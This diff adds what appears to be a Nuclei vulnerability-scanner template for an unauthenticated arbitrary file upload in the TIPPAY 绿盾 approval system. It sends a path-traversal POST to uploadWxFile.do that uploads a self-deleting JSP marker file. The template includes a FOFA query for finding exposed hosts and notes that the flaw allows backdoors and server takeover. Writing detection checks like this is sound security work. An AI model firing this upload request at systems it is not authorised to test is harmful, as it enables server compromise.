@@ -1,0 +1,37 @@
+http:
+    - raw:
+        - |
+          POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Accept-Encoding: gzip
+
+          --WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+          Content-Type: application/vnd.ms-excel
+
+          <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+          --WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    - matchers:
+        - dsl:
+            - status_code==200 && contains_all(body,"pboyjnnrfipmplsukdeczudsefxmywe")
+          name: 任意文件上传
+          type: dsl
+      raw:
+        - |
+          GET /{{username}}.jsp HTTP/1.1
+          Host: {{Hostname}}
+id: TianRui-uploadWxFile-File-upload
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="TIPPAY-绿盾审批系统"
+        天锐绿盾审批系统 uploadWxFile.do 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 天锐绿盾审批系统 uploadWxFile.do 任意文件上传
+    reference:
+        - null
+    severity: critical
+    tags:
+        - Servlet
+variables:
+    username: '{{to_lower(rand_base(6))}}'
